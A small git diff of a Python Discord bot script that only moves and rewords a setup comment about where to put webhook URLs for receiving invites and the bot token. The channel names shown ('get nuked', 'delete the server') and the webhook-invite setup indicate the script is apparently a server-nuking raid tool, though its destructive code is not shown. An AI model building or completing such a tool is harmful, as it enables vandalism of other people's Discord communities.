@@ -1,3 +1,4 @@
+#MAKE SURE YOU PUT WEBHOOKS FOR THE BOT TO SEND YOU INVITES TO IN ON LINE 134!! AND YOUR BOTS TOKEN ON LINE 12
 import discord
 from discord.ext import commands
 import random
@@ -8,7 +9,6 @@ from colorama import Fore, Style
 import asyncio
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-#MAKE SURE YOU PUT WEBHOOKS IN ONE LINE 134!!
 token = "Token HERE"
 
 CHANNEL_NAMES = ["get nuked", "delete the server", "get fucked", "trash server"]
